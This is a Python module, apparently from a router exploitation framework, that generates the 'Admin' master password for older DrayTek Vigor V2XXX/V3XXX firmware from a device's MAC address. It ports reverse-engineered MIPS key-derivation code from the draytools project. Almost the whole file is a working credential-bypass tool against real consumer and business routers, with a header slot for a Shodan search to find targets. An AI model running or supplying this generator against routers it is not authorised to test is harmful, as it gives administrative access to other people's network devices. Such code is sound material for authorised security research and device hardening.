# Name:Draytek Vigor V2XXX and V3XXX master key generator
# File:vigor_master_key.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 17.2.2014
# Last modified: 17.2.2014
# Shodan Dork:
# Description: Generates master key for older FW versions of Vigor routers based on MAC address.
# Based on draytools work of Nikita Abdullin (AMMOnium) https://github.com/ammonium/draytools

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac

import re
from binascii import unhexlify


class Misc(core.Misc.RextMisc):
    """
Name:Draytek Vigor V2XXX and V3XXX master key generator
File:vigor_master_key.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 17.2.2014
Description: Generates master key for older FW versions of Vigor routers based on MAC address.
Based on: draytools work of Nikita Abdullin (AMMOnium) https://github.com/ammonium/draytools

Options:
    Name        Description

    mac         MAC address used as input for master password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        xmac = unhexlify(bytes(re.sub('[:\-]', '', self.mac), 'UTF-8'))
        print_success("credentials generated")
        print("Username: Admin")
        print("Password: " + self.spkeygen(xmac))

    #This is a port for py3 from draytools, original author is Nikita Abdullin
    def spkeygen(self, mac):
            """Generate a master key like 'AbCdEfGh' from MAC address"""
            # stupid translation from MIPS assembly, but works
            atu = 'WAHOBXEZCLPDYTFQMJRVINSUGK'
            atl = 'kgusnivrjmqftydplczexbohaw'
            res = ['\x00'] * 8
            st = [0] * 8
            # compute 31*(31*(31*(31*(31*m0+m1)+m2)+m3)+m4)+m5, sign-extend mac bytes
            a3 = 0
            for i in mac:
                    v1 = a3 << 5
                    v1 &= 0xFFFFFFFF
                    a0 = i
                    if a0 >= 0x80:
                            a0 |= 0xFFFFFF00
                    v1 -= a3
                    v1 &= 0xFFFFFFFF
                    a3 = v1 + a0
                    a3 &= 0xFFFFFFFF
            # Divide by 13 :) Old assembly trick, I leave it here
            # 0x4EC4EC4F is a multiplicative inverse for 13
            ck = 0x4EC4EC4F * a3
            v1 = (ck & 0xFFFFFFFF00000000) >> 32
            # shift by two
            v1 >>= 3
            v0 = v1 << 1
            v0 &= 0xFFFFFFFF
            # trick ends here and now v0 = a3 / 13
            v0 += v1
            v0 <<= 2
            v0 &= 0xFFFFFFFF
            v0 += v1
            v0 <<= 1
            v0 -= a3
    #	v0 &= 0xFFFFFFFF
            st[0] = a3
            res[0] = atu[abs(v0)]

            for i in range(1, 8):
                    v1 = st[i-1]
                    a0 = ord(res[0])
                    t0 = ord(res[1])
                    v0 = (v1 << 5) & 0xFFFFFFFF
                    a1 = ord(res[2])
                    v0 -= v1
                    v0 += a0
                    a2 = ord(res[3])
                    a3 = ord(res[4])
                    v0 += t0
                    v0 += a1
                    t0 = ord(res[5])
                    v1 = ord(res[6])
                    v0 += a2
                    a0 = ord(res[7])
                    v0 += a3
                    v0 += t0
                    v0 += v1
                    # v0 here is a 32-bit sum of currently computed key chars
                    v0 &= 0xFFFFFFFF
                    a3 = v0 + a0
                    # Again divide by 13
                    i1 = a3 * 0x4EC4EC4F
                    a0 = i & 1
                    st[i] = a3
                    v1 = (i1 & 0xFFFFFFFF00000000) >> 32
                    v1 >>= 3
                    v0 = v1 << 1
                    # here v0 = a3 / 13
                    v0 += v1
                    v0 <<= 2
                    v0 += v1
                    v0 <<= 1
                    v0 = a3 - v0
                    a1 += v0
                    v0 &= 0xFFFFFFFF
                    if a0 == 0:
                            v1 = atu[abs(v0)]
                    else:
                            v1 = atl[abs(v0)]
                    res[i] = v1
                    v0 = 0
            return ''.join(res)

Misc()